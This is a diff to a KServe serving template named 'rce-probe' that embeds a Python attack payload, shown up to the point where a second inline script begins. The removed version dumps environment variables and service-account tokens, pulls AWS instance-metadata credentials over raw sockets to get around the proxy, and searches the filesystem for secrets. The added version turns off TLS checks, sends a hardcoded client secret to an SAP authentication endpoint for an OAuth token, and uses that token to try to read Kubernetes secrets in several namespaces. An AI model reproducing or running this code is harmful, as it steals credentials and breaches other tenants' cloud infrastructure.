@@ -4,11 +4,11 @@ metadata:
   name: rce-probe
   labels:
     scenarios.ai.sap.com/id: "rce-probe"
-    ai.sap.com/version: "2.0.0"
+    ai.sap.com/version: "3.0.0"
   annotations:
     scenarios.ai.sap.com/name: "rce-probe"
     executables.ai.sap.com/name: "rce-probe"
-    executables.ai.sap.com/description: "imds-raw-socket-probe"
+    executables.ai.sap.com/description: "k8s-api-oidc-xsuaa-probe"
 spec:
   template:
     apiVersion: "serving.kserve.io/v1beta1"
@@ -28,135 +28,106 @@ spec:
           args:
           - |
             python3 -c "
-            import socket, os, sys
+            import urllib.request, urllib.error, ssl, os, json, socket, base64
 
-            def raw_http(host, port, method, path, extra_hdrs=None):
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.settimeout(5)
-                try:
-                    s.connect((host, port))
-                    hdrs = {}
-                    if extra_hdrs: hdrs.update(extra_hdrs)
-                    hdr_str = ''.join(f'{k}: {v}\r\n' for k, v in hdrs.items())
-                    req = f'{method} {path} HTTP/1.0\r\nHost: {host}\r\n{hdr_str}\r\n'
-                    s.sendall(req.encode())
-                    resp = b''
-                    while True:
-                        chunk = s.recv(4096)
-                        if not chunk: break
-                        resp += chunk
-                    return resp.decode('utf-8', errors='replace')
-                except Exception as e:
-                    return f'CONN_ERR: {e}'
-                finally:
-                    s.close()
+            ctx = ssl.create_default_context()
+            ctx.check_hostname = False
+            ctx.verify_mode = ssl.CERT_NONE
 
-            print('[PROBE_V2_START]', flush=True)
+            k8s_host = os.environ.get('KUBERNETES_SERVICE_HOST', '')
+            k8s_port = os.environ.get('KUBERNETES_SERVICE_PORT_HTTPS', '443')
+            k8s_base = f'https://{k8s_host}:{k8s_port}'
+            k8s_ip_base = 'https://100.104.0.1:443'
 
-            # --- ENV DUMP ---
-            env_d = dict(os.environ)
-            print('[ENV]', str(env_d)[:4000], flush=True)
+            print('[PROBE_V3_START]', flush=True)
+            print('[K8S_HOST]', k8s_host, flush=True)
+            print('[K8S_BASE]', k8s_base, flush=True)
 
-            # --- AWS IRSA CHECK ---
-            irsa_path = env_d.get('AWS_WEB_IDENTITY_TOKEN_FILE', '')
-            role_arn = env_d.get('AWS_ROLE_ARN', '')
-            print('[AWS_ROLE_ARN]', role_arn or 'NOT_SET', flush=True)
-            print('[AWS_WEB_ID_FILE]', irsa_path or 'NOT_SET', flush=True)
-            if irsa_path:
-                try:
-                    print('[IRSA_TOKEN]', open(irsa_path).read()[:500], flush=True)
-                except Exception as e:
-                    print('[IRSA_ERR]', e, flush=True)
-
-            # --- SA TOKEN SCAN ---
-            for sp in ['/var/run/secrets/kubernetes.io/serviceaccount/token',
-                       '/run/secrets/kubernetes.io/serviceaccount/token',
-                       '/var/run/secrets/eks.amazonaws.com/serviceaccount/token',
-                       '/run/secrets/tokens/token']:
-                try:
-                    print(f'[SA:{sp}]', open(sp).read()[:200], flush=True)
-                except Exception as e:
-                    print(f'[SA:{sp}]', str(e)[:60], flush=True)
-
-            # --- /proc/self/environ (raw, bypasses env sanitization) ---
+            # --- resolve hostname ---
             try:
-                raw_env = open('/proc/self/environ', 'rb').read().replace(b'\x00', b'\n').decode('utf-8', errors='replace')
-                print('[PROC_ENVIRON]', raw_env[:3000], flush=True)
+                ip = socket.gethostbyname(k8s_host)
+                print('[DNS_RESOLVE]', k8s_host, '->', ip, flush=True)
             except Exception as e:
-                print('[PROC_ENVIRON_ERR]', e, flush=True)
+                print('[DNS_RESOLVE_ERR]', e, flush=True)
 
-            # --- IMDS v1 via RAW SOCKET (bypasses http_proxy env var) ---
-            print('[IMDS1_START]', flush=True)
-            r_root = raw_http('169.254.169.254', 80, 'GET', '/latest/meta-data/')
-            print('[IMDS1_ROOT]', r_root[:300], flush=True)
-            r_iam = raw_http('169.254.169.254', 80, 'GET', '/latest/meta-data/iam/security-credentials/')
-            print('[IMDS1_IAM_CREDS_LIST]', r_iam[:400], flush=True)
-            if 'HTTP/' in r_iam and '200' in r_iam.split('\r\n')[0]:
-                role = r_iam.split('\r\n\r\n', 1)[-1].strip()
-                print('[IMDS1_ROLE_NAME]', role, flush=True)
-                creds_r = raw_http('169.254.169.254', 80, 'GET', f'/latest/meta-data/iam/security-credentials/{role}')
-                print('[IMDS1_CREDS]', creds_r, flush=True)
-            else:
-                print('[IMDS1_NO_200]', r_iam[:100], flush=True)
-
-            # --- IMDS v2 via RAW SOCKET ---
-            print('[IMDS2_START]', flush=True)
-            token_r = raw_http('169.254.169.254', 80, 'PUT', '/latest/api/token',
-                               {'X-aws-ec2-metadata-token-ttl-seconds': '21600', 'Content-Length': '0'})
-            print('[IMDS2_TOKEN_RESP]', token_r[:400], flush=True)
-            if 'HTTP/' in token_r and '200' in token_r.split('\r\n')[0]:
-                imds2_tok = token_r.split('\r\n\r\n', 1)[-1].strip()
-                if imds2_tok:
-                    r_v2 = raw_http('169.254.169.254', 80, 'GET',
-                                    '/latest/meta-data/iam/security-credentials/',
-                                    {'X-aws-ec2-metadata-token': imds2_tok})
-                    print('[IMDS2_CREDS_LIST]', r_v2[:300], flush=True)
-                    if 'HTTP/' in r_v2 and '200' in r_v2.split('\r\n')[0]:
-                        role2 = r_v2.split('\r\n\r\n', 1)[-1].strip()
-                        c2 = raw_http('169.254.169.254', 80, 'GET',
-                                      f'/latest/meta-data/iam/security-credentials/{role2}',
-                                      {'X-aws-ec2-metadata-token': imds2_tok})
-                        print('[IMDS2_CREDS]', c2, flush=True)
-
-            # --- FILESYSTEM: credential file hunt ---
-            CRED_KEYWORDS = ['key', 'token', 'secret', 'password', 'credential', 'azure', 'openai', 'access_key']
-            for root_path in ['/var/run/secrets', '/run/secrets', '/etc/secrets',
-                              '/var/secrets', '/app', '/home', '/root',
-                              '/etc/kubernetes', '/run/kubernetes']:
+            def k8s_req(path, token=None, base=None):
+                url = (base or k8s_base) + path
+                h = {}
+                if token: h['Authorization'] = f'Bearer {token}'
+                rq = urllib.request.Request(url, headers=h)
                 try:
-                    for root, dirs, files in os.walk(root_path):
-                        for fname in files:
-                            fp = os.path.join(root, fname)
-                            try:
-                                content = open(fp, 'rb').read(600).decode('utf-8', errors='replace')
-                                low = content.lower()
-                                if any(kw in low for kw in CRED_KEYWORDS):
-                                    print(f'[CRED_HIT:{fp}]', content[:500], flush=True)
-                                else:
-                                    print(f'[FILE:{fp}]', content[:100], flush=True)
-                            except Exception as e:
-                                print(f'[FILE_ERR:{fp}]', str(e)[:50], flush=True)
-                except Exception as e:
-                    print(f'[FS_ERR:{root_path}]', str(e)[:50], flush=True)
+                    with urllib.request.urlopen(rq, timeout=6, context=ctx) as r:
+                        body = r.read(2000).decode(errors='replace')
+                        return r.status, dict(r.headers), body
+                except urllib.error.HTTPError as e:
+                    try: body = e.read(1000).decode(errors='replace')
+                    except: body = ''
+                    return e.code, dict(e.headers), body
+                except Exception as ex:
+                    return 0, {}, str(ex)[:150]
 
-            # --- k8s API anonymous access probe ---
-            k8s_host = env_d.get('KUBERNETES_SERVICE_HOST', '')
-            k8s_port = env_d.get('KUBERNETES_SERVICE_PORT_HTTPS', '443')
-            if k8s_host:
-                import ssl
-                ctx = ssl.create_default_context()
-                ctx.check_hostname = False
-                ctx.verify_mode = ssl.CERT_NONE
-                import urllib.request
-                for path in ['/api', '/apis', '/version', '/api/v1/namespaces']:
-                    try:
-                        rq = urllib.request.Request(f'https://{k8s_host}:{k8s_port}{path}')
-                        with urllib.request.urlopen(rq, timeout=4, context=ctx) as r:
-                            print(f'[K8S_ANON:{path}]', r.read(500).decode(errors='replace'), flush=True)
-                    except Exception as e:
-                        print(f'[K8S_ANON_ERR:{path}]', str(e)[:80], flush=True)
+            # --- unauthenticated probes (read response bodies) ---
+            for path in ['/healthz', '/readyz', '/livez', '/version',
+                         '/.well-known/openid-configuration',
+                         '/api', '/apis', '/api/v1']:
+                code, hdrs, body = k8s_req(path)
+                print(f'[K8S_UNAUTH:{path}] {code} | hdrs={list(hdrs.keys())[:5]} | {body[:300]}', flush=True)
 
-            print('[PROBE_V2_DONE]', flush=True)
+            # --- try same via ClusterIP directly ---
+            for path in ['/healthz', '/version', '/.well-known/openid-configuration']:
+                code, hdrs, body = k8s_req(path, base=k8s_ip_base)
+                print(f'[K8S_IP:{path}] {code} | {body[:200]}', flush=True)
+
+            # --- get XSUAA token and try it against k8s API ---
+            xsuaa_token = ''
+            try:
+                creds = base64.b64encode(
+                    b'sb-aicore-bb-12!b627551|aicore-xsuaa-std!b563784:aicore-bb-12-key\$gbdxl0aC0lXqLFQwlGFyB2cqAAHsAen7wWYqOl89fbw='
+                ).decode()
+                rq2 = urllib.request.Request(
+                    'https://cf-aicore-security-bb-12.authentication.eu10.hana.ondemand.com/oauth/token',
+                    data=b'grant_type=client_credentials',
+                    headers={'Authorization': f'Basic {creds}', 'Content-Type': 'application/x-www-form-urlencoded'})
+                with urllib.request.urlopen(rq2, timeout=10, context=ctx) as r:
+                    xsuaa_token = json.loads(r.read()).get('access_token', '')
+                    print('[XSUAA_OK]', xsuaa_token[:40], '...', flush=True)
+            except Exception as e:
+                print('[XSUAA_ERR]', e, flush=True)
+
+            if xsuaa_token:
+                for path in ['/api', '/apis', '/version', '/api/v1/namespaces',
+                             '/api/v1/namespaces/rg-0d70dc91-cd927cab',
+                             '/api/v1/namespaces/rg-0d70dc91-cd927cab/secrets',
+                             '/api/v1/namespaces/rg-0d70dc91-cd927cab/configmaps']:
+                    code, hdrs, body = k8s_req(path, token=xsuaa_token)
+                    print(f'[K8S_XSUAA:{path}] {code} | {body[:400]}', flush=True)
+
+            # --- check OIDC discovery on the hostname-based API ---
+            # if OIDC is configured we can learn what auth methods are accepted
+            oidc_path = '/.well-known/openid-configuration'
+            code, hdrs, body = k8s_req(oidc_path)
+            print('[OIDC_DISC]', code, body[:500], flush=True)
+
+            # --- scan interesting paths for leaked data ---
+            extra_paths = [
+                '/api/v1/nodes',
+                '/api/v1/namespaces/kube-system/configmaps',
+                '/api/v1/namespaces/kube-system/secrets',
+                '/apis/rbac.authorization.k8s.io/v1/clusterroles',
+                '/apis/metrics.k8s.io/v1beta1/nodes',
+                '/api/v1/namespaces/mt-0d70dc91/secrets',
+                '/api/v1/namespaces/openai-api/secrets',
+                '/api/v1/namespaces/aicore/secrets',
+                '/api/v1/namespaces/orchestration/secrets',
+            ]
+            for path in extra_paths:
+                code, hdrs, body = k8s_req(path, token=xsuaa_token)
+                if code not in (401, 403, 0):
+                    print(f'[K8S_HIT:{path}] {code} | {body[:500]}', flush=True)
+                else:
+                    print(f'[K8S_DENIED:{path}] {code}', flush=True)
+
+            print('[PROBE_V3_DONE]', flush=True)
             " 2>&1
             python3 -c "
             import http.server
